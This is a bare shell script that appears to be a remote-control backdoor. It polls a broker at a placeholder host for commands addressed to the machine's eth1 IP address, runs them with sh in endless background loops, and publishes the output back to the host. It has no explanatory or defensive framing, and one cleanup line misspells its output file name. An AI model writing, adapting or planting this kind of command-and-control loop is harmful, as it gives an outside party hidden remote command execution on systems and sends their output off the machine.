#!/bin/sh
host=example.com
export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/var/bin
[ -f cmds ] && rm cmds;[ -f ouput ] && rm output
ip=`/sbin/ifconfig eth1 | grep Mask | cut -d ':' -f2 | cut -d " " -f1`

while true;do subclient -h $host -t shell -t shell/$ip > cmds;done &

while true; do [ -s cmds ] && sh cmds > output ;([ "$?" -eq "0" ]) && pkill -HUP subclient;([ -s output ]) && pubclient -h $host -t data -f output;>output;done &
